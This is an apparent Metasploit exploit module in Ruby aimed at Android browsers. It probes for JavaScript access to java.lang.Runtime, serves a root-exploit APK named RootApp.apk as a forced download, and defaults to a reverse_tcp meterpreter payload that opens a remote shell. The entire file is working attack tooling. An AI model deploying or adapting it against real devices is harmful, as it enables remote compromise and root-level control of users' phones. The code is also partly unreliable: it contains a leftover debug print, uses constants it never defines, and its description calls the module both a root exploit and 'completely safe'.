##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/android'

class Metasploit3 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::BrowserExploitServer
  include Msf::Exploit::Remote::BrowserAutopwn
  include Msf::Exploit::Android

  autopwn_info(
    :os_flavor  => 'Android',
    :javascript => true,
    :rank       => ExcellentRanking,
    :vuln_test  => %Q|
      for (i in top) {
        try {
          top[i].getClass().forName('java.lang.Runtime');
          is_vuln = true; break;
        } catch(e) {}
      }
    |
  )

  def initialize(info = {})
    print "initialize called?!"
    super(update_info(info,
      'Name'                => 'Android Root exploitation and testing',
      'Description'         => %q{
            This module exploits various known root exploits in android using an android application.
            The application then runs a command supplied by the user as root.
            It does not root the device - completely safe to run on any device.
      },
      'License'             => MSF_LICENSE,
      'Author'              => [
        'Danko', # original msf module
      ],
      'References'          => [
        ['URL', 'https://github.com/android-rooting-tools/android_run_root_shell'],
      ],
      'Platform'            => 'android',
      'Arch'                => ARCH_DALVIK,
      'DefaultOptions'      => { 'PAYLOAD' => 'android/meterpreter/reverse_tcp' },
      'Targets'             => [ [ 'Android ARM', {'Platform' => 'android', 'Arch' => ARCH_ARMLE} ] ],
      'DisclosureDate'      => 'Dec 21 2012',
      'DefaultTarget'       => 0,
      'BrowserRequirements' => {
        :source     => 'script',
        :os_flavor  => 'Android'
      }
    ))
  end

  # handle any uri request with the exploit apk
  def on_request_uri(cli, req)
    serve_static_apk(cli, req)
  end

  # # The browser appears to be vulnerable, serve the exploit
  # def on_request_exploit(cli, req, browser)
  #   arch = normalize_arch(browser[:arch])
  #   print_status "Serving #{arch} exploit..."
  #   send_response_html(cli, html(arch))
  # end

  def serve_static_apk(cli, req)
    arch          = req.qstring['arch']

    # if arch.present?
    response_opts = { 'Content-Type' => 'application/vnd.android.package-archive',
                      'Content-Disposition' => 'attachment; filename="RootApp.apk"'}
    print_status("Serving RootApp for arch #{normalize_arch arch}")
    send_response(cli, get_root_app('doesnt matter'), response_opts)
    # else
    #   response_opts = { 'Content-type' => 'text/javascript' }
    #   print_status("Serving arch detection javascript")
    #   send_response(cli, static_arch_detect_js, response_opts)
    # end
  end

  def get_root_app(arch)
    localfile = File.join(Msf::Config::InstallRoot, 'data', 'android', 'RootApp.apk')
    data = File.read(localfile, :mode => 'rb')

    return data
  end

  # This is served to requests for the static .js file.
  # Because we have to use javascript to detect arch, we have 3 different
  # versions of the static .js file (x86/mips/arm) to choose from. This
  # small snippet of js detects the arch and requests the correct file.
  def static_arch_detect_js
    %Q|
      var arches = {};
      arches['#{ARCH_ARMLE}']  = /arm/i;
      arches['#{ARCH_MIPSLE}'] = /mips/i;
      arches['#{ARCH_X86}']    = /x86/i;

      var arch = null;
      for (var name in arches) {
        if (navigator.platform.toString().match(arches[name])) {
          arch = name;
          break;
        }
      }

      if (arch) {
        // load the script with the correct arch
        var script = document.createElement('script');
        script.setAttribute('src', '#{get_uri}/#{Rex::Text::rand_text_alpha(5)}.js?arch='+arch);
        script.setAttribute('type', 'text/javascript');

        // ensure body is parsed and we won't be in an uninitialized state
        setTimeout(function(){
          var node = document.body \|\| document.head;
          node.appendChild(script);
        }, 100);
      }
    |
  end

  # @return [String] normalized client architecture
  def normalize_arch(arch)
    if SUPPORTED_ARCHES.include?(arch) then arch else DEFAULT_ARCH end
  end

  def html(arch)
    "<!doctype html><html><body><script>#{get_root_app(arch)}</script></body></html>"
  end
end
